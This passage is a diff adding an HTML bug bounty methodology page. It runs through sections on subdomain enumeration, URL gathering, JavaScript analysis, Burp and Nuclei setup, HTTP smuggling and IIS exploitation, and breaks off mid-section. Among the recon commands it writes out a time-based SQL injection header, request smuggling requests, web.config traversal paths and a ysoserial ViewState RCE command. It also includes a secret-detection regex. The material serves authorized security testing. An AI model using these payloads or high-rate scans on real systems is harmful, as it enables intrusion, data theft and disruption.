@@ -1,0 +1,3061 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-src 'none'; object-src 'none'; base-uri 'self';">
+  <title>RV_U Methodology - Bug Bounty Hunting Platform</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<!-- Sidebar Overlay (mobile) -->
+<div id="sidebar-overlay"></div>
+
+<!-- ===== SIDEBAR ===== -->
+<nav id="sidebar">
+  <div class="sidebar-header">
+    <div class="sidebar-logo">RV_U <span>Methodology</span></div>
+    <input type="text" id="sidebar-search" class="sidebar-search" placeholder="🔍 Search sections...">
+  </div>
+  <div id="sidebar-nav">
+    <div class="nav-section-title">Reconnaissance</div>
+    <a class="nav-link" data-target="sec-1"><span class="nav-num">01</span> Subdomain Enumeration</a>
+    <a class="nav-link" data-target="sec-2"><span class="nav-num">02</span> Subdomain Takeover</a>
+    <a class="nav-link" data-target="sec-3"><span class="nav-num">03</span> URL Gathering</a>
+    <div class="nav-section-title">Discovery</div>
+    <a class="nav-link" data-target="sec-4"><span class="nav-num">04</span> PHP Hunting</a>
+    <a class="nav-link" data-target="sec-5"><span class="nav-num">05</span> JavaScript Analysis</a>
+    <a class="nav-link" data-target="sec-6"><span class="nav-num">06</span> Burp Suite Config</a>
+    <a class="nav-link" data-target="sec-7"><span class="nav-num">07</span> Nuclei Scanning</a>
+    <a class="nav-link" data-target="sec-8"><span class="nav-num">08</span> Firefox Extensions</a>
+    <a class="nav-link" data-target="sec-9"><span class="nav-num">09</span> HTTPX Advanced</a>
+    <div class="nav-section-title">Exploitation</div>
+    <a class="nav-link" data-target="sec-10"><span class="nav-num">10</span> HTTP Smuggling</a>
+    <a class="nav-link" data-target="sec-11"><span class="nav-num">11</span> IIS Exploitation</a>
+    <a class="nav-link" data-target="sec-12"><span class="nav-num">12</span> SQL Injection</a>
+    <a class="nav-link" data-target="sec-13"><span class="nav-num">13</span> RCE</a>
+    <a class="nav-link" data-target="sec-14"><span class="nav-num">14</span> XSS</a>
+    <a class="nav-link" data-target="sec-15"><span class="nav-num">15</span> WebSockets</a>
+    <div class="nav-section-title">Authentication</div>
+    <a class="nav-link" data-target="sec-16"><span class="nav-num">16</span> Authentication Testing</a>
+    <a class="nav-link" data-target="sec-17"><span class="nav-num">17</span> Rate Limiting Bypass</a>
+    <a class="nav-link" data-target="sec-18"><span class="nav-num">18</span> Payment Bypass</a>
+    <a class="nav-link" data-target="sec-19"><span class="nav-num">19</span> CSRF</a>
+    <div class="nav-section-title">Web Vulnerabilities</div>
+    <a class="nav-link" data-target="sec-20"><span class="nav-num">20</span> HTML Injection</a>
+    <a class="nav-link" data-target="sec-21"><span class="nav-num">21</span> Captcha Bypass</a>
+    <a class="nav-link" data-target="sec-22"><span class="nav-num">22</span> Cache Poisoning</a>
+    <a class="nav-link" data-target="sec-23"><span class="nav-num">23</span> Cache Deception</a>
+    <a class="nav-link" data-target="sec-24"><span class="nav-num">24</span> Business Logic</a>
+    <a class="nav-link" data-target="sec-25"><span class="nav-num">25</span> CRLF Injection</a>
+    <a class="nav-link" data-target="sec-26"><span class="nav-num">26</span> File Upload</a>
+    <a class="nav-link" data-target="sec-27"><span class="nav-num">27</span> DOM Invader</a>
+    <a class="nav-link" data-target="sec-28"><span class="nav-num">28</span> OAuth Attacks</a>
+    <a class="nav-link" data-target="sec-29"><span class="nav-num">29</span> JWT Attacks</a>
+    <a class="nav-link" data-target="sec-30"><span class="nav-num">30</span> Session Attacks</a>
+    <a class="nav-link" data-target="sec-31"><span class="nav-num">31</span> IDOR &amp; Business Logic</a>
+    <a class="nav-link" data-target="sec-32"><span class="nav-num">32</span> Race Condition</a>
+    <div class="nav-section-title">API &amp; Technologies</div>
+    <a class="nav-link" data-target="sec-33"><span class="nav-num">33</span> API Testing</a>
+    <a class="nav-link" data-target="sec-34"><span class="nav-num">34</span> Swagger-UI</a>
+    <a class="nav-link" data-target="sec-35"><span class="nav-num">35</span> GraphQL Testing</a>
+    <a class="nav-link" data-target="sec-36"><span class="nav-num">36</span> Technology-Specific</a>
+    <div class="nav-section-title">Advanced</div>
+    <a class="nav-link" data-target="sec-37"><span class="nav-num">37</span> Local Storage</a>
+    <a class="nav-link" data-target="sec-38"><span class="nav-num">38</span> EXIF Data</a>
+    <a class="nav-link" data-target="sec-39"><span class="nav-num">39</span> Directory Fuzzing</a>
+    <a class="nav-link" data-target="sec-40"><span class="nav-num">40</span> Static Page Testing</a>
+    <a class="nav-link" data-target="sec-41"><span class="nav-num">41</span> CORS</a>
+    <a class="nav-link" data-target="sec-42"><span class="nav-num">42</span> Clickjacking</a>
+    <a class="nav-link" data-target="sec-43"><span class="nav-num">43</span> Broken Link Hijacking</a>
+    <a class="nav-link" data-target="sec-44"><span class="nav-num">44</span> Open Redirect</a>
+    <a class="nav-link" data-target="sec-45"><span class="nav-num">45</span> SSRF</a>
+    <a class="nav-link" data-target="sec-46"><span class="nav-num">46</span> Command Injection</a>
+    <a class="nav-link" data-target="sec-47"><span class="nav-num">47</span> JSON Testing</a>
+    <a class="nav-link" data-target="sec-48"><span class="nav-num">48</span> S3 Bucket Testing</a>
+    <a class="nav-link" data-target="sec-49"><span class="nav-num">49</span> Cloud Hacking</a>
+    <a class="nav-link" data-target="sec-50"><span class="nav-num">50</span> Source Code Review</a>
+    <div class="nav-section-title">OSINT &amp; Recon</div>
+    <a class="nav-link" data-target="sec-51"><span class="nav-num">51</span> GitHub Dorking</a>
+    <a class="nav-link" data-target="sec-52"><span class="nav-num">52</span> Google Dorks</a>
+    <a class="nav-link" data-target="sec-53"><span class="nav-num">53</span> Info Disclosure</a>
+    <a class="nav-link" data-target="sec-54"><span class="nav-num">54</span> 403 Bypass</a>
+    <a class="nav-link" data-target="sec-55"><span class="nav-num">55</span> Shodan &amp; Recon</a>
+    <div class="nav-section-title">Other</div>
+    <a class="nav-link" data-target="sec-56"><span class="nav-num">56</span> Prototype Pollution</a>
+    <a class="nav-link" data-target="sec-57"><span class="nav-num">57</span> Port Scanning</a>
+    <a class="nav-link" data-target="sec-58"><span class="nav-num">58</span> DoS Techniques</a>
+    <a class="nav-link" data-target="sec-59"><span class="nav-num">59</span> Android APK Testing</a>
+    <a class="nav-link" data-target="sec-60"><span class="nav-num">60</span> Privilege Escalation</a>
+    <a class="nav-link" data-target="sec-61"><span class="nav-num">61</span> HTTP Methods</a>
+    <a class="nav-link" data-target="sec-62"><span class="nav-num">62</span> Lack of Security Controls</a>
+    <a class="nav-link" data-target="sec-63"><span class="nav-num">63</span> SSL/TLS Issues</a>
+    <a class="nav-link" data-target="sec-64"><span class="nav-num">64</span> Useful Resources</a>
+  </div>
+</nav>
+
+<!-- ===== MAIN CONTENT ===== -->
+<div id="main-content">
+
+  <!-- Topbar -->
+  <div id="topbar">
+    <button id="sidebar-toggle" title="Toggle Sidebar">☰</button>
+    <input type="text" id="global-search" placeholder="🔍 Search methodology... (Ctrl+K)">
+    <span id="search-results-count"></span>
+    <span class="topbar-hint">64 sections</span>
+  </div>
+
+  <!-- Hero & Domain Input -->
+  <div id="hero">
+    <h1 class="hero-title"><span class="accent-green">RV_U</span> <span class="accent-cyan">Methodology</span></h1>
+    <p class="hero-subtitle">Complete Bug Bounty Hunting Platform — 64 Sections of Professional Offensive Security Techniques</p>
+
+    <!-- Domain Input System -->
+    <div id="domain-input-system">
+      <div class="input-system-title">🎯 Target Input System</div>
+
+      <div class="input-row">
+        <input type="text" id="target-input" placeholder="e.g. *.example.com, example.com, 192.168.1.1, https://example.com">
+        <select id="target-type-select">
+          <option value="auto">🔍 Auto Detect</option>
+          <option value="wildcard">🌐 Wildcard</option>
+          <option value="domain">🏠 Domain</option>
+          <option value="subdomain">📦 Subdomain</option>
+          <option value="ip">🖥️ Single IP</option>
+          <option value="iprange">📡 IP Range</option>
+          <option value="url">🔗 URL</option>
+        </select>
+        <button class="btn btn-green" id="add-target-btn">+ Add</button>
+        <label id="file-upload-label" title="Upload .txt file with domains">📁 Upload .txt<input type="file" id="file-upload" accept=".txt"></label>
+        <button class="btn btn-red btn-sm" id="clear-targets-btn">✕ Clear All</button>
+      </div>
+
+      <p style="font-size:.78rem;color:var(--text-muted);margin:4px 0 8px;">
+        Supports: <code>*.example.com</code> (wildcard) · <code>example.com</code> (domain) · <code>192.168.1.0/24</code> (CIDR) · bulk paste (newline/comma separated)
+      </p>
+
+      <div id="target-tags"></div>
+
+      <button class="btn btn-green" id="start-methodology">🚀 Start Methodology</button>
+    </div>
+
+    <!-- Progress Bar -->
+    <div id="progress-bar-container">
+      <div class="progress-label">
+        <span>Methodology Progress</span>
+        <span id="progress-label-text">0/64 sections completed (0%)</span>
+      </div>
+      <div class="progress-track">
+        <div id="progress-fill"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== METHODOLOGY SECTIONS ===== -->
+  <div id="content">
+
+    <!-- ==================== SECTION 1 ==================== -->
+    <section class="methodology-section" id="sec-1">
+      <div class="section-header">
+        <span class="section-num">01</span>
+        <span class="section-title">Subdomain Enumeration</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+
+        <div class="subsection">
+          <div class="subsection-title">Security Trails</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>https://securitytrails.com/
+curl --request GET \
+  --url 'https://api.securitytrails.com/v1/domain/bluewin.ch/subdomains?children_only=false&include_inactive=true' \
+  --header 'APIKEY: YOUR_API_KEY' \
+  --header 'accept: application/json'</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">SubdomainFinder c99</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">url</span><button class="copy-btn"></button></div><pre><code>https://subdomainfinder.c99.nl/</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">ShrewdEye &amp; Others</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">url</span><button class="copy-btn"></button></div><pre><code>https://shrewdeye.app/search/
+https://www.vedbex.com
+https://dnsdumpster.com/</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">ASN Enumeration</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># Find ASN for company
+https://bgp.he.net/search
+
+# Shodan search by ASN
+shodan search asn:AS8300
+
+# Reverse CIDR to get domains
+prips 173.0.84.0/24 | hakrevdns -r 1.1.1.1
+
+# Masscan for port scanning
+masscan 193.110.154.0/24 -p 1-65535 --rate 100000 \
+  --output-format json --exclude 255.255.255.255 \
+  --output-filename scan-results.json
+
+# Parse masscan results
+cat scan-results.json | sed -e '/^\[/d' -e '/^\]/d' -e 's/,$//' \
+  | jq -r '[.ip, .ports[0].port] | @tsv' \
+  | sed 's/\t/:/' | sort -u > alive-hosts</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Amass</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>amass enum -config /root/.config/amass/config.yaml -df httpx \
+  -t /root/nuclei-templates/ -o nuclei
+
+amass intel -org "Tesla"
+# Output: 8911, TESLATEL-AS / 50313, TESLATEL-AS / 394161, TESLA - Tesla
+
+amass intel -active -asn 394161
+whois -h whois.radb.net -- '-i origin AS3303' \
+  | grep -Eo "([0-9.]+){4}/[0-9]+" | sort -u
+
+amass intel -active -cidr 192.168.1.0/24</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">DNScan</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>python3 /home/hossam/tools/dnscan/dnscan.py -d gs.com \
+  -w best-dns-wordlist.txt -t 1000</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Reverse IP</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>prips 173.0.84.0/24 | hakrevdns -r 1.1.1.1
+for i in $(prips 194.147.200.0/21); do dig -x $i +short; done
+https://search.dnslytics.com/cidr/
+https://viewdns.info/reverseip/?host=</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Subfinder</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>echo "site.com" | subfinder</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Assetfinder</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>cat domains | assetfinder -subs-only</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Virtual Host Discovery</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>ffuf -u https://example.com -w wordlist -H "Host: FUZZ.example.com"</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Email Address Enumeration</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">url</span><button class="copy-btn"></button></div><pre><code>https://newapp.anymailfinder.com
+# Discover domains related to specific email
+https://website.informer.com/email/it-domains@snapchat.com</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">crt.sh (Certificate Transparency)</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># By organization
+curl 'https://crt.sh/?o=%25.$1&output=json' \
+  | jq -r '.[].common_name' | grep -v '*' | sort | uniq | tee -a domainsOrg.txt
+
+# By domain
+curl -s "https://crt.sh/?q=%25.rednexus.tech&output=json" \
+  | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Netlas</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">url</span><button class="copy-btn"></button></div><pre><code># Search for subdomains
+https://app.netlas.io/domains/?indices=&page=1&q=domain%3A(domain%3A*.paypal.com)
+
+# Search by response body
+https://app.netlas.io/responses/?q=http.body:(hubspot)&page=1&indices=
+
+# Search for Jenkins
+https://app.netlas.io/responses/?q=http.headers.x_jenkins:* OR http.headers.x_jenkins_cli2_port:* OR http.headers.x_jenkins_session:*&page=1</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Filter Interesting Subdomains</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>cat allsubdomains | egrep "internal|dev|jira|admin|secret|test|production|private|login|staging|dev"</code></pre></div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 2 ==================== -->
+    <section class="methodology-section" id="sec-2">
+      <div class="section-header">
+        <span class="section-num">02</span>
+        <span class="section-title">Subdomain Takeover</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>subzy run --targets subs.txt --hide_fails --vuln \
+  | grep -v -E "Akamai|xyz|available|\-"
+subjack -w subs.txt -t 100 -timeout 30 -o takeovers -ssl
+
+# AWS S3 Takeover Check
+http -b GET http://{SOURCE DOMAIN NAME} \
+  | grep -E -q '&lt;Code&gt;NoSuchBucket&lt;/Code&gt;|&lt;li&gt;Code: NoSuchBucket&lt;/li&gt;' \
+  &amp;&amp; echo "Subdomain takeover may be possible" \
+  || echo "Subdomain takeover is not possible"</code></pre></div>
+        <div class="info-box tip"><span class="info-icon">💡</span><div>Look for CNAME records pointing to unclaimed third-party services: AWS S3, GitHub Pages, Heroku, Fastly, Shopify, etc.</div></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 3 ==================== -->
+    <section class="methodology-section" id="sec-3">
+      <div class="section-header">
+        <span class="section-num">03</span>
+        <span class="section-title">URL Gathering</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>echo "example.com" | waymore
+gospider -S httpx | sed -n 's/.*\(https:\/\/[^ ]*\)]*.*/\1/p' &gt;&gt; gospider.txt
+
+# Wayback Machine
+https://web.archive.org/cdx/search/cdx?url=*.example.com&fl=original&collapse=urlkey
+
+# gau - GetAllURLs
+echo "example.com" | gau --threads 5 --o urls.txt
+
+# hakrawler
+echo "https://example.com" | hakrawler -depth 3 -plain
+
+# katana
+katana -u https://example.com -jc -d 5 -o katana.txt</code></pre></div>
+
+        <div class="subsection">
+          <div class="subsection-title">Sensitive Files</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
+nuclei -l allurls.txt -t /root/nuclei-templates/http/exposures</code></pre></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 4 ==================== -->
+    <section class="methodology-section" id="sec-4">
+      <div class="section-header">
+        <span class="section-num">04</span>
+        <span class="section-title">PHP Hunting</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>cat allurls | grep ".php" | httpx -o php.txt
+
+# Arjun parameter discovery
+for i in $(cat php.txt); do arjun -u $i; done
+arjun -u https://example.com/file.php --get
+arjun -u https://example.com/file.php -m GET
+python3 arjun.py -i burp_targets.txt
+
+# ParamSpider
+paramspider -d example.com &gt;&gt; allparam
+cat allparam | grep "FUZZ" &gt;&gt; fuzzing.txt
+
+# Nuclei fuzzing
+nuclei -l fuzzing.txt -t /root/fuzzing-templates -o secrets.txt</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 5 ==================== -->
+    <section class="methodology-section" id="sec-5">
+      <div class="section-header">
+        <span class="section-num">05</span>
+        <span class="section-title">JavaScript Analysis</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>cat allurls | grep -E "\.js" &gt;&gt; alljs
+
+# LinkFinder &amp; SecretFinder
+linkfinder.py -i Target.com -d -o alljs
+cat js.txt | while read url; do python3 SecretFinder.py -i $url -o cli; done
+
+# Nuclei on JS files
+nuclei -t /root/nuclei-templates/http/exposures/ -l js
+nuclei -l js.txt -t nuclei-templates/exposures/tokens/generic
+
+# Token spray after finding tokens
+nuclei -t nuclei-templates/token-spray -var token=TOKEN_HERE
+
+# JSScan
+python jsscan.py urls.txt js-url.txt js-directory
+
+# Extract URLs from JS
+cat test.txt | grep -aEo 'https?://[^ ]+' | sed 's/]$//' | sort -u | grep -aEi "\.(js)"
+
+# Mantra
+cat js.txt | mantra
+
+# jsluice &amp; jsnice.org for analysis
+# https://jsnice.org/</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 6 ==================== -->
+    <section class="methodology-section" id="sec-6">
+      <div class="section-header">
+        <span class="section-num">06</span>
+        <span class="section-title">Burp Suite Configuration</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+
+        <div class="subsection">
+          <div class="subsection-title">Secret / API Key Detection Regex</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">regex</span><button class="copy-btn"></button></div><pre><code>(?i)(api[_-]?key|apikey|access[_-]?key|secret[_-]?key|private[_-]?key|auth[_-]?token|bearer[_-]?token|client[_-]?secret|oauth[_-]?token|refresh[_-]?token|session[_-]?token|user[_-]?token|admin[_-]?token|master[_-]?key|encryption[_-]?key|signing[_-]?key|jwt[_-]?secret|webhook[_-]?secret|password|passwd|pwd|credentials|stripe[_-]?key|twilio[_-]?token|sendgrid[_-]?key|firebase[_-]?key|aws[_-]?key|aws[_-]?secret|google[_-]?api|azure[_-]?key)[\s]*[=:]\s*['"]?([a-zA-Z0-9_\-\.+\/]{8,100})['"]?</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">IP Address Detection Regex</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">regex</span><button class="copy-btn"></button></div><pre><code>((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">S3 Bucket Detection Regex</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">regex</span><button class="copy-btn"></button></div><pre><code>(s3-|s3\.)?(.*)\.amazonaws\.com</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Proxy Match &amp; Replace Techniques</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code># Add custom headers to all requests:
+Match: Request header
+Replace: X-Forwarded-For: 127.0.0.1
+
+# Remove security headers:
+Match: Response header "X-Frame-Options: .*"
+Replace: (empty)
+
+# Change User-Agent:
+Match: Request header "User-Agent: .*"
+Replace: User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">304 Not Modified Bypass</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code># Remove If-None-Match and If-Modified-Since headers via match &amp; replace
+# to bypass 304 Not Modified responses and get full content</code></pre></div>
+        </div>
+
+        <div class="info-box note"><span class="info-icon">🔌</span><div><strong>Extensions:</strong> LINKDUMPER, BURPJSfinder, AuthMatrix, Turbo Intruder, Param Miner, Logger++, ActiveScan++</div></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 7 ==================== -->
+    <section class="methodology-section" id="sec-7">
+      <div class="section-header">
+        <span class="section-num">07</span>
+        <span class="section-title">Nuclei Scanning</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>nuclei -l httpx -t brute-force/* -t cves/* -t basic-detections/* \
+  -t dns/* -t files/* -t panels/* \
+  -t security-misconfiguration/* -t subdomain-takeover/* \
+  -t technologies/* -t token/* -t vulnerabilities/*
+
+# With rate limiting
+nuclei -l httpx -rl 100 -c 25 -timeout 10 -retries 2
+
+# Specific CVEs
+nuclei -l urls.txt -t cves/ -severity critical,high
+
+# Custom templates
+nuclei -u https://example.com -t /path/to/custom-templates/
+
+# Update templates
+nuclei -update-templates</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 8 ==================== -->
+    <section class="methodology-section" id="sec-8">
+      <div class="section-header">
+        <span class="section-num">08</span>
+        <span class="section-title">Firefox Extensions</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <ul class="checklist">
+          <li><label><input type="checkbox"> <span><strong>Gopher</strong> — Intercept &amp; modify requests directly in browser</span></label></li>
+          <li><label><input type="checkbox"> <span><strong>PwnFox</strong> — Firefox extension with isolated containers for multi-session testing</span></label></li>
+          <li><label><input type="checkbox"> <span><strong>.git Detector</strong> — Automatically detects exposed .git directories</span></label></li>
+          <li><label><input type="checkbox"> <span><strong>Retire.js</strong> — Identifies vulnerable JavaScript libraries in use</span></label></li>
+          <li><label><input type="checkbox"> <span><strong>Wappalyzer</strong> — Technology fingerprinting</span></label></li>
+          <li><label><input type="checkbox"> <span><strong>FoxyProxy</strong> — Proxy management for Burp Suite routing</span></label></li>
+          <li><label><input type="checkbox"> <span><strong>HackBar</strong> — Quick HTTP request manipulation</span></label></li>
+          <li><label><input type="checkbox"> <span><strong>Cookie-Editor</strong> — Inspect and modify cookies</span></label></li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 9 ==================== -->
+    <section class="methodology-section" id="sec-9">
+      <div class="section-header">
+        <span class="section-num">09</span>
+        <span class="section-title">HTTPX Advanced Usage</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>httpx -path /.git -sc --silent
+httpx -path /.git/config -sc --silent
+httpx -path /.git/logs/HEAD -sc --silent
+
+# Time-based SQL injection via header
+cat domain.txt | httpx -silent \
+  -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" \
+  -rt -timeout 20 -mrt '&gt;13'
+
+# PHPInfo detection
+httpx -l domains.txt --status-code --title -path /phpinfo.php | grep 'phpinfo()'
+
+# Full scan with tech detection
+httpx -l domains.txt -sc -td -title -ip -cdn -o httpx-results.txt
+
+# Screenshot
+httpx -l urls.txt -screenshot -o screenshots/
+
+# Probe with custom paths
+httpx -l domains.txt -path /admin,/api,/swagger,/.env -sc -mc 200,301,302</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 10 ==================== -->
+    <section class="methodology-section" id="sec-10">
+      <div class="section-header">
+        <span class="section-num">10</span>
+        <span class="section-title">HTTP Request Smuggling</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+
+        <div class="subsection">
+          <div class="subsection-title">CL.TE (Content-Length / Transfer-Encoding)</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">http</span><button class="copy-btn"></button></div><pre><code>POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">TE.CL (Transfer-Encoding / Content-Length)</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">http</span><button class="copy-btn"></button></div><pre><code>POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+
+</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">TE.TE (Transfer-Encoding obfuscation)</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">http</span><button class="copy-btn"></button></div><pre><code>Transfer-Encoding: xchunked
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding:[tab]chunked
+[space]Transfer-Encoding: chunked
+X: X[\n]Transfer-Encoding: chunked
+Transfer-Encoding
+: chunked</code></pre></div>
+        </div>
+
+        <div class="info-box tip"><span class="info-icon">🔧</span><div>Use <strong>HTTP Request Smuggler</strong> Burp extension to automate detection. Also test with smuggler.py tool.</div></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 11 ==================== -->
+    <section class="methodology-section" id="sec-11">
+      <div class="section-header">
+        <span class="section-num">11</span>
+        <span class="section-title">IIS Exploitation</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+
+        <div class="subsection">
+          <div class="subsection-title">ShortScan &amp; Detection</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># ShortScan for IIS shortname vulnerability
+shortscan https://example.com
+
+# Detect HTTPAPI/2.0
+curl -I https://example.com | grep -i "server: Microsoft-HTTPAPI"
+
+# IIS shortname scanner
+java -jar iis_shortname_scanner.jar 20 8 https://example.com/</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Host Hopping</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">http</span><button class="copy-btn"></button></div><pre><code>GET / HTTP/1.1
+Host: internal-server.local
+X-Original-URL: /admin
+X-Rewrite-URL: /admin</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">web.config Extraction</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>curl https://example.com/web.config
+curl https://example.com/%2e%2e/web.config
+curl https://example.com/..%2fweb.config</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">VIEWSTATE RCE</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># If VIEWSTATE is not encrypted and validation is disabled
+# Use ysoserial.net to generate payload:
+ysoserial.exe -p ViewState -g TextFormattingRunProperties \
+  -c "cmd /c whoami" --validationalg="SHA1" \
+  --validationkey="YOUR_VALIDATION_KEY"</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Directory Indexing &amp; DLL Download</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># Check for directory listing
+curl https://example.com/bin/
+curl https://example.com/App_Code/
+
+# Download DLL for reverse engineering
+curl -O https://example.com/bin/App.dll
+
